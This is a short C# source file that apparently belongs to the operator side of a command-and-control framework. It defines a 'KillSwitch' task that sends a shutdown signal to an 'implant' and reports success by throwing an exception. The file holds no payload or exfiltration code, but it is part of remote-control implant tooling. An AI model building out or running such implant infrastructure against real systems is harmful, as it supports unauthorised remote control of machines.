using System;


namespace Client.Utils
{
    internal class KillSwitch : Models.AdminTask
    {
        public override string TaskName => "KillSwitch";

        public override string Desc => "Send shutdown signal to implant";

        public override string AdminUtilExec(string[] opts)
        {
            try {
                var resp = TaskOps.sendAdminUtil("KillSwitch");
                return "";
            } catch (System.Net.WebException) { throw new Exception($"Implant successfully shutdown"); }
        }
    }
}
